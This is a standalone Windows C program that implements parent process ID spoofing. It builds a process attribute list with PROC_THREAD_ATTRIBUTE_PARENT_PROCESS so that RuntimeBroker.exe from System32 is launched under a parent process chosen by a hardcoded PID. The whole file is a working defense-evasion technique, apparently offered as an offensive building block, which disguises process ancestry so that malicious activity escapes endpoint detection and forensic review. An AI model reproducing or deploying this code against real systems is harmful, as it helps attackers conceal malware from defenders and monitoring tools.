#include <windows.h>
#include <stdio.h>

#define MAX_PATH_LENGTH 260
#define PARENT_ID 9704

BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR lpPath[MAX_PATH_LENGTH * 2];
    CHAR WnDr[MAX_PATH];

    SIZE_T sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    sprintf_s(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    SiEx.lpAttributeList = pThreadAttList;

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &SiEx.StartupInfo,
        &Pi)) {
        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main() {
    // Example usage

    HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_ID);
    if (hParentProcess == NULL) {
        printf("Failed to open parent process. Error code: %d\n", GetLastError());
        return 1;
    }

    DWORD dwProcessId;
    HANDLE hProcess, hThread;

    BOOL success = CreatePPidSpoofedProcess(hParentProcess, "RuntimeBroker.exe", &dwProcessId, &hProcess, &hThread);
    if (success) {
        printf("Process with spoofed PPID created successfully. Process ID: %d\n", dwProcessId);
    }
    else {
        printf("Failed to create process with spoofed PPID.\n");
    }

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
